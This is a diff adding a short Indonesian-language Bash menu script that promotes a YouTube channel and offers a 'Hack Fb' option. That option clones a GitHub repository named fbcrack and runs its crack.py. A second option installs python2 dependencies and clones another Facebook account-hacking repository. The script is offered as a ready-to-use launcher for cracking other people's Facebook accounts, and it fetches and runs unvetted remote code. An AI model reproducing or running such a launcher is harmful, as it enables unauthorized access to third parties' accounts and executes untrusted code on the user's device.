@@ -1,0 +1,43 @@
+
+clear
+sleep 3
+echo "================================"
+sleep 1
+echo "NAMA=PRIVASI"
+sleep 1
+echo "chanel yt = && IM IT HACKING"
+sleep  1
+echo "DAN SUBSCRIBE CHANEL GURU IT SAYA  "
+sleep  1
+echo "Hanief Aktivisme"                               
+sleep  1
+echo "================================"
+sleep 1
+figlet -f small "Polosan cuk"
+echo "(1)Hack Fb"
+sleep 1
+echo "(2)Install bahan dulu sayang"
+sleep 1
+echo "(3)Exit"
+sleep 1
+read -p "pilih nomor: " input;
+if [ $input = 1 ]
+then
+git clone https://github.com/haniefaktivisme/fbcrack.git
+cd fbcrack
+python crack.py
+cowok
+fi
+if [ $input = 2 ]
+then
+clear
+pkg update;pkg upgrade;pkg install python2;pkg install git;pip2 install requests;pip2 install mechanize;git clone https://github.com/aimscar/hackakunfb.git
+fi
+if [ $input = 3 ]
+then
+clear
+echo " tunggu sebentar lagi coli...."
+sleep 3
+exit
+fi
+
